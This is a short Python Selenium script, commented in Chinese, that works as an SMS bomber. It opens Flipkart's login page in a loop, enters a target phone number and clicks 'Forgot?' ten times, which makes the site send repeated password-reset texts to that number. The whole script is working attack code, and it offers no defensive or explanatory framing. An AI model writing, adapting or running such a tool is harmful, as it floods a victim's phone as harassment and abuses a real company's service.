# 导入selenium库
from selenium import webdriver
import time

# 创建一个浏览器对象
browser = webdriver.Chrome()

# 设置轰炸的次数和手机号码
frequency = 10
mobile_number = "1234567890"

# 循环发送短信
for i in range(frequency):
    # 打开flipkart网站
    browser.get('https://www.flipkart.com/account/login?ret=/')
    # 找到输入手机号码的元素
    number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
    # 输入手机号码
    number.send_keys(mobile_number)
    # 找到忘记密码的链接
    forgot = browser.find_element_by_link_text('Forgot?')
    # 点击忘记密码
    forgot.click()
    # 等待2秒
    time.sleep(2)

# 关闭浏览器
browser.quit()
